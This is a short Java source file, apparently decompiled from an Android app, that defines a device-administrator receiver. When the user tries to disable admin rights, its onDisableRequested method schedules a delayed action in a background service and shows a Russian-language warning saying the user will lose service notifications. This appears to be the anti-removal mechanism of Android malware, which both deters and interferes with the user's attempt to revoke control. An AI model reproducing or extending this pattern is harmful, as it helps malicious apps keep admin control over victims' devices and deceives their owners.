package com.address.core;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    public void onEnabled(Context context, Intent intent) {
    }

    public CharSequence onDisableRequested(Context context, Intent intent) {
        RunService.getService();
        RunService.onTickHandler.sendEmptyMessageDelayed(111, 2000);
        return "Вы не сможете принимать оповещения от службы, вы уверены?";
    }

    public void onDisabled(Context context, Intent intent) {
    }

    public void onPasswordChanged(Context context, Intent intent) {
    }

    public void onPasswordFailed(Context context, Intent intent) {
    }

    public void onPasswordSucceeded(Context context, Intent intent) {
    }

    public void onPasswordExpiring(Context context, Intent intent) {
    }
}
